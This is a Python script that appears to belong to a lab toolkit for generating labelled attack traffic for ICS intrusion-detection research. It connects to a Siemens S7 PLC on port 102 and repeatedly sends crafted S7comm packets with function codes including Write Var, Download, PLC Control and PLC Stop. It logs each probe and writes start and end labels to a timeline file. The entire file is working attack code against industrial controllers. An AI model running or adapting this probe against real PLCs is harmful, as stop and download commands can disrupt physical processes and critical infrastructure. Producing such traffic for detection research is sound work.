"""
S7_FUNC_PROBE
Kỹ thuật: Gửi nhiều S7 function code tới PLC để probe khả năng.
Function codes: Read Var (0x04), Write Var (0x05), Setup Comm (0xF0),
               Download (0x1A-0x1F), PLC Control (0x28), PLC Stop (0x29).
MITRE: T0846 — Remote System Discovery

Gọi từ bash:
  python -m attacks_ext.s7_probe \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import socket
import struct
import time
import random
from attacks_ext.config_ext import base_parser, write_label

# S7 function codes to probe
PROBE_FUNCTIONS = [
    (0xF0, "Setup Communication"),
    (0x04, "Read Var"),
    (0x05, "Write Var"),
    (0x1A, "Request Download"),
    (0x1B, "Download Block"),
    (0x1C, "Download Ended"),
    (0x1D, "Start Upload"),
    (0x1E, "Upload"),
    (0x1F, "End Upload"),
    (0x28, "PLC Control"),
    (0x29, "PLC Stop"),
]


def build_s7_probe(func_code):
    """Build a minimal S7 PDU with given function code."""
    # TPKT header
    tpkt = b"\x03\x00\x00\x16"  # version, reserved, length=22
    # COTP header
    cotp = b"\x02\xf0\x80"     # length, PDU type, TPDU number
    # S7 header
    s7_hdr = bytes([
        0x32,       # protocol ID
        0x01,       # message type (Job)
        0x00, 0x00, # reserved
        0x00, 0x00, # PDU reference
        0x00, 0x08, # parameter length
        0x00, 0x00, # data length
    ])
    # S7 parameter: function code + reserved
    s7_param = bytes([func_code, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])

    return tpkt + cotp + s7_hdr + s7_param


def run(args):
    label_prefix = "S7_FUNC_PROBE"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    sent = 0

    try:
        print(f"[*] S7 Function Code Probe -> {args.target}:102")

        end_time = time.time() + args.duration
        while time.time() < end_time:
            for func_code, func_name in PROBE_FUNCTIONS:
                if time.time() >= end_time:
                    break

                pkt = build_s7_probe(func_code)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((args.target, 102))
                    s.send(pkt)
                    try:
                        resp = s.recv(1024)
                        result = f"response={len(resp)}b"
                    except Exception:
                        result = "no_response"
                    s.close()
                    sent += 1
                    print(f"  [{sent:03d}] 0x{func_code:02X} {func_name:<18} -> {result}")
                except Exception as e:
                    print(f"  [{sent:03d}] 0x{func_code:02X} {func_name:<18} -> {e}")

                time.sleep(random.uniform(0.5, 1.5))

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"probes={sent}")


def main():
    p = base_parser("S7 Function Code Probe (T0846)")
    p.add_argument("--target", default="192.168.210.211")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
